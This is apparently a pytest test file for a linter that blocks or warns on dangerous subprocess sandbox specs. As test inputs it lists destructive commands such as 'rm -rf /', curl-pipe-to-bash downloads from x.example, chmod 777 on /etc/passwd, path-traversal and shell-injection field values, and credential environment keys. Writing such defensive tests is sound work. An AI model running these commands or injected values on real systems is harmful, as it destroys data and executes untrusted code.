"""Tests for V1462 — ASI Real Subprocess Sandbox Spec Security Linter + Policy Gate.

Test plan (主 00:44 质量工程化):
  1. LintFinding + LintReport dataclasses
  2. Severity + PolicyLevel enums
  3. Rule set: 24 rules reachable + each rule has code+severity+field+pattern+msg
  4. Command-pattern rules — happy path (no findings) + 7 BLOCK/WARN patterns
  5. image_alias path-traversal + shell-metachar blocks
  6. workdir_basename path-traversal + absolute-path + shell-metachar blocks
  7. env_extra deny-substring cross-check with V1461
  8. Bounds: timeout short + max_output short
  9. policy_gate under 3 levels
 10. run_v1462 demo: 7 specs, allow/block counts
 11. CLI: status / popper / chain / meta / help
 12. V3 guards (5)
 13. V1462 guards (12)
 14. JSONL batch CLI
 15. Cross-consistency with V1461 SandboxSpec.is_valid()
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from apeireth.v1462_asi_subprocess_sandbox_spec_security_linter import (  # noqa: E402
    LintFinding,
    LintReport,
    LintSeverity,
    PolicyLevel,
    V1462_MODULE,
    V1462_SCHEMA,
    V1462_VERSION,
    _DEMO_SPECS,
    _get_rules,
    lint_spec,
    main,
    policy_gate,
    run_v1462,
    write_report_json,
    write_report_md,
)
from apeireth.v1461_asi_docker_equivalent_subprocess_sandbox import SandboxSpec  # noqa: E402


# ---------------------------------------------------------------------------
# 1. Enums + dataclasses
# ---------------------------------------------------------------------------


def test_severity_enum_has_three_values():
    assert {s.value for s in LintSeverity} == {"INFO", "WARN", "BLOCK"}


def test_policy_level_enum_has_three_values():
    assert {p.value for p in PolicyLevel} == {"PERMISSIVE", "STANDARD", "STRICT"}


def test_lint_finding_to_dict_roundtrip():
    f = LintFinding(
        rule_code="SL060",
        severity=LintSeverity.BLOCK,
        field="command",
        message="rm -rf /",
        token="rm -rf /",
        pattern=r"\brm\s+-rf?\s+/",
    )
    d = f.to_dict()
    assert d["rule_code"] == "SL060"
    assert d["severity"] == "BLOCK"
    assert d["field"] == "command"
    assert d["message"] == "rm -rf /"
    assert d["token"] == "rm -rf /"
    assert d["pattern"] == r"\brm\s+-rf?\s+/"


def test_lint_report_counts():
    r = LintReport(
        spec_image_alias="python:local",
        spec_command=["python", "-c", "print(1)"],
        policy_level=PolicyLevel.STANDARD,
        findings=[
            LintFinding("SL060", LintSeverity.BLOCK, "command", "x"),
            LintFinding("SL070", LintSeverity.WARN, "command", "y"),
            LintFinding("SL076", LintSeverity.INFO, "command", "z"),
        ],
    )
    r.total = len(r.findings)
    r.block_count = sum(1 for f in r.findings if f.severity == LintSeverity.BLOCK)
    r.warn_count = sum(1 for f in r.findings if f.severity == LintSeverity.WARN)
    r.info_count = sum(1 for f in r.findings if f.severity == LintSeverity.INFO)
    assert r.total == 3
    assert r.block_count == 1
    assert r.warn_count == 1
    assert r.info_count == 1


# ---------------------------------------------------------------------------
# 2. Rule set
# ---------------------------------------------------------------------------


def test_rule_set_minimum_24():
    rules = _get_rules()
    assert len(rules) >= 24


def test_rule_set_well_formed():
    for r in _get_rules():
        assert all(k in r for k in ("code", "severity", "field", "pattern", "msg", "applies"))
        assert isinstance(r["severity"], LintSeverity)


def test_rule_codes_in_v1462_range():
    for r in _get_rules():
        code = r["code"]
        assert code.startswith("SL")
        # SL060..SL099
        n = int(code[2:])
        assert 60 <= n <= 99


def test_rule_applies_field_valid():
    valid = {"command", "image_alias", "workdir_basename", "timeout_s", "max_output_bytes"}
    for r in _get_rules():
        assert r["applies"] in valid


def test_popper_cmd():
    rc = main(["popper"])
    assert rc == 0


# ---------------------------------------------------------------------------
# 3. Command-pattern rules
# ---------------------------------------------------------------------------


def test_command_clean_python():
    spec = SandboxSpec(command=["python", "-c", "print('hello')"], timeout_s=15)
    rep = lint_spec(spec)
    # No BLOCK / WARN from command rules; SL090 may fire if timeout in [10,69]
    codes = {f.rule_code for f in rep.findings}
    assert "SL060" not in codes
    assert "SL061" not in codes
    assert "SL063" not in codes
    assert "SL070" not in codes  # no sudo


def test_command_blocks_rm_rf_root():
    spec = SandboxSpec(command=["bash", "-c", "rm -rf / --no-preserve-root"], timeout_s=10)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL060" in codes


def test_command_blocks_rm_rf_home():
    spec = SandboxSpec(command=["bash", "-c", "rm -rf ~"], timeout_s=10)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL061" in codes


def test_command_blocks_curl_pipe_bash():
    spec = SandboxSpec(command=["bash", "-c", "curl https://x.example/i.sh | bash"], timeout_s=10)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL063" in codes


def test_command_blocks_wget_pipe_sh():
    spec = SandboxSpec(command=["sh", "-c", "wget -qO- https://x.example/i.sh | sh"], timeout_s=10)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL064" in codes


def test_command_warns_sudo():
    spec = SandboxSpec(command=["sudo", "ls"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL070" in codes


def test_command_warns_chmod_root():
    spec = SandboxSpec(command=["chmod", "777", "/etc/passwd"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL069" in codes


def test_command_warns_no_preserve_root():
    spec = SandboxSpec(command=["bash", "-c", "rm -rf /tmp/x --no-preserve-root"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL073" in codes


def test_command_warns_shutdown():
    spec = SandboxSpec(command=["shutdown", "-h", "now"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL067" in codes


def test_command_warns_shell_substitution():
    spec = SandboxSpec(command=["bash", "-c", "echo $(whoami)"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL075" in codes


def test_command_empty_blocked():
    spec = SandboxSpec(command=[], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL078" in codes


# ---------------------------------------------------------------------------
# 4. image_alias rules
# ---------------------------------------------------------------------------


def test_image_alias_path_traversal_blocked():
    spec = SandboxSpec(image_alias="../../etc/passwd", command=["cat", "x"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL080" in codes


def test_image_alias_shell_metachar_blocked():
    spec = SandboxSpec(image_alias="python;rm -rf /", command=["echo", "x"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL081" in codes


def test_image_alias_clean_python():
    spec = SandboxSpec(image_alias="python:local", command=["python", "-c", "print(1)"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL080" not in codes
    assert "SL081" not in codes


def test_image_alias_short_warn():
    spec = SandboxSpec(image_alias="py", command=["python", "-c", "print(1)"], timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL082" in codes


# ---------------------------------------------------------------------------
# 5. workdir_basename rules
# ---------------------------------------------------------------------------


def test_workdir_basename_parent_dir_blocked():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], workdir_basename="../etc", timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL085" in codes


def test_workdir_basename_absolute_blocked():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], workdir_basename="C:\\evil", timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL086" in codes


def test_workdir_basename_shell_metachar_blocked():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], workdir_basename="foo;rm", timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL087" in codes


def test_workdir_basename_clean():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], workdir_basename="my-run", timeout_s=15)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL085" not in codes
    assert "SL086" not in codes
    assert "SL087" not in codes


# ---------------------------------------------------------------------------
# 6. env_extra cross-check with V1461
# ---------------------------------------------------------------------------


def test_env_extra_token_blocked():
    spec = SandboxSpec(
        command=["python", "-c", "print(1)"],
        env_extra={"GITHUB_TOKEN": "ghp_abc"},
        timeout_s=15,
    )
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL092" in codes


def test_env_extra_password_blocked():
    spec = SandboxSpec(
        command=["python", "-c", "print(1)"],
        env_extra={"DB_PASSWORD": "hunter2"},
        timeout_s=15,
    )
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL092" in codes


def test_env_extra_clean_path():
    spec = SandboxSpec(
        command=["python", "-c", "print(1)"],
        env_extra={"PATH": "/usr/bin"},
        timeout_s=15,
    )
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL092" not in codes


# ---------------------------------------------------------------------------
# 7. Bounds
# ---------------------------------------------------------------------------


def test_timeout_short_warn():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], timeout_s=20)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL090" in codes


def test_timeout_default_no_warn():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], timeout_s=30)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL090" not in codes


def test_max_output_short_warn():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], timeout_s=30, max_output_bytes=400)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL091" in codes


def test_max_output_default_no_warn():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], timeout_s=30, max_output_bytes=4096)
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL091" not in codes


# ---------------------------------------------------------------------------
# 8. policy_gate under 3 levels
# ---------------------------------------------------------------------------


def test_policy_gate_permissive_only_blocks():
    spec = SandboxSpec(command=["bash", "-c", "rm -rf /"], timeout_s=10)
    allowed_perm, viol_perm = policy_gate(spec, PolicyLevel.PERMISSIVE)
    assert allowed_perm is False
    assert any(f.severity == LintSeverity.BLOCK for f in viol_perm)


def test_policy_gate_standard_blocks_warn_and_block():
    spec = SandboxSpec(command=["sudo", "ls"], timeout_s=15)
    allowed_std, viol_std = policy_gate(spec, PolicyLevel.STANDARD)
    assert allowed_std is False
    assert any(f.severity == LintSeverity.WARN for f in viol_std)
    # Permissive would allow this
    allowed_perm, viol_perm = policy_gate(spec, PolicyLevel.PERMISSIVE)
    assert allowed_perm is True
    assert viol_perm == []


def test_policy_gate_strict_blocks_warn():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], timeout_s=30)
    # Default — clean spec, all good
    allowed, _ = policy_gate(spec, PolicyLevel.STRICT)
    assert allowed is True


def test_policy_gate_strict_blocks_short_timeout():
    spec = SandboxSpec(command=["python", "-c", "print(1)"], timeout_s=20)
    allowed_std, _ = policy_gate(spec, PolicyLevel.STANDARD)
    assert allowed_std is False
    allowed_perm, _ = policy_gate(spec, PolicyLevel.PERMISSIVE)
    assert allowed_perm is True
    allowed_strict, _ = policy_gate(spec, PolicyLevel.STRICT)
    assert allowed_strict is False


# ---------------------------------------------------------------------------
# 9. Findings stable ordering
# ---------------------------------------------------------------------------


def test_findings_ordering_stable():
    spec = SandboxSpec(
        command=["sudo", "bash", "-c", "rm -rf /"],
        timeout_s=15,
    )
    r1 = lint_spec(spec)
    r2 = lint_spec(spec)
    seq1 = [(f.rule_code, f.severity) for f in r1.findings]
    seq2 = [(f.rule_code, f.severity) for f in r2.findings]
    assert seq1 == seq2
    # BLOCK before WARN
    if any(f.severity == LintSeverity.BLOCK for f in r1.findings) and any(
        f.severity == LintSeverity.WARN for f in r1.findings
    ):
        assert seq1.index(("SL060", LintSeverity.BLOCK)) < seq1.index(("SL070", LintSeverity.WARN))


# ---------------------------------------------------------------------------
# 10. run_v1462 demo
# ---------------------------------------------------------------------------


def test_run_v1462_demo_returns_seven_specs():
    payload = run_v1462()
    assert payload["schema"] == V1462_SCHEMA
    assert payload["version"] == V1462_VERSION
    assert payload["n_specs"] == len(_DEMO_SPECS)
    assert payload["allowed_count"] + payload["blocked_count"] == payload["n_specs"]


def test_demo_specs_expected_blocking():
    payload = run_v1462()
    by_label = {r["label"]: r for r in payload["results"]}
    # ok_python_hello should be allowed
    assert by_label["ok_python_hello"]["allowed"] is True
    # block_rm_rf_root should be blocked under PERMISSIVE (BLOCK)
    assert by_label["block_rm_rf_root"]["allowed"] is False
    # block_curl_pipe_bash blocked under STANDARD
    assert by_label["block_curl_pipe_bash"]["allowed"] is False
    # block_image_traversal blocked under PERMISSIVE
    assert by_label["block_image_traversal"]["allowed"] is False
    # block_env_token blocked under STANDARD
    assert by_label["block_env_token"]["allowed"] is False
    # ok_safe_eval_documented clean python under STRICT
    assert by_label["ok_safe_eval_documented"]["allowed"] is True


# ---------------------------------------------------------------------------
# 11. CLI
# ---------------------------------------------------------------------------


def test_cli_status():
    rc = main(["status"])
    assert rc == 0


def test_cli_chain():
    rc = main(["chain"])
    assert rc == 0


def test_cli_meta():
    rc = main(["meta"])
    assert rc == 0


def test_cli_help():
    rc = main(["help"])
    assert rc == 0


def test_cli_popper_returns_zero():
    rc = main(["popper"])
    assert rc == 0


def test_cli_run_with_jsonl(tmp_path: Path):
    jsonl = tmp_path / "specs.jsonl"
    rows = [
        {
            "image_alias": "python:local",
            "command": ["python", "-c", "print(1)"],
            "timeout_s": 30,
            "max_output_bytes": 4096,
        },
        {
            "image_alias": "python:local",
            "command": ["bash", "-c", "rm -rf /"],
            "timeout_s": 10,
            "max_output_bytes": 4096,
        },
    ]
    jsonl.write_text("\n".join(json.dumps(r) for r in rows), encoding="utf-8")
    rc = main(["run", str(jsonl), "--policy", "PERMISSIVE"])
    assert rc == 0


def test_cli_demo_writes_reports(tmp_path: Path):
    rc = main(["demo", "--out", str(tmp_path)])
    assert rc == 0
    assert (tmp_path / ".v1462-sandbox-spec-security-linter-report.json").exists()
    assert (tmp_path / ".v1462-sandbox-spec-security-linter-report.md").exists()


# ---------------------------------------------------------------------------
# 12. V3 guards
# ---------------------------------------------------------------------------


def test_v3_guards_in_meta():
    rc = main(["meta"])
    assert rc == 0
    # meta prints JSON; re-invoke with capture
    import io
    import contextlib

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        main(["meta"])
    meta = json.loads(buf.getvalue())
    guards = meta["v3_guards"]
    assert "GUARD_LINTER_NOT_ANTIVIRUS" in guards
    assert "GUARD_LINTER_NOT_ASI" in guards
    assert "GUARD_LINTER_NOT_PHENOMENAL" in guards
    assert "GUARD_LINTER_NOT_HUMAN_LEVEL" in guards
    assert "GUARD_LINTER_NOT_SANDBOX_ESCAPE" in guards


# ---------------------------------------------------------------------------
# 13. V1462 module-level guards
# ---------------------------------------------------------------------------


def test_v1462_module_metadata():
    assert V1462_MODULE == "v1462_asi_subprocess_sandbox_spec_security_linter"
    assert V1462_SCHEMA.startswith("v1462.")
    assert V1462_VERSION == "0.1.0"


def test_report_writers(tmp_path: Path):
    payload = run_v1462()
    j = tmp_path / "r.json"
    m = tmp_path / "r.md"
    write_report_json(j, payload)
    write_report_md(m, payload)
    assert j.exists() and j.stat().st_size > 100
    assert m.exists() and m.stat().st_size > 100
    # JSON parses
    parsed = json.loads(j.read_text(encoding="utf-8"))
    assert parsed["n_specs"] == payload["n_specs"]
    # MD contains the table header
    text = m.read_text(encoding="utf-8")
    assert "| label | policy |" in text
    assert "Honest disclosure" in text


# ---------------------------------------------------------------------------
# 14. Cross-consistency with V1461 SandboxSpec
# ---------------------------------------------------------------------------


def test_v1461_invalid_spec_also_v1462_blocked():
    # SandboxSpec.is_valid() flags env_extra bad keys + bounds.
    # V1462 should also flag the env_extra issue with SL092.
    spec = SandboxSpec(
        command=["python", "-c", "print(1)"],
        env_extra={"SECRET_KEY": "leak"},
        timeout_s=200,  # > MAX_TIMEOUT_S → V1461 flags BOUNDED_ERROR
        max_output_bytes=4096,
    )
    v1461_ok, v1461_issues = spec.is_valid()
    assert v1461_ok is False
    assert any("timeout_s" in i for i in v1461_issues)
    # V1462 should flag SL092 for the bad env key (timeout >120 not caught by V1462,
    # which is correct — V1462 lints spec content, not bounds-to-spec, V1461 does bounds).
    rep = lint_spec(spec)
    codes = {f.rule_code for f in rep.findings}
    assert "SL092" in codes


# ---------------------------------------------------------------------------
# 15. chain_delegate explicit reference
# ---------------------------------------------------------------------------


def test_chain_v1462_borrows():
    rc = main(["chain"])
    assert rc == 0
    import io
    import contextlib

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        main(["chain"])
    chain = json.loads(buf.getvalue())
    assert "v1461" in chain
    assert chain["all_ok"] is True
    assert "v1462_borrows_from" in chain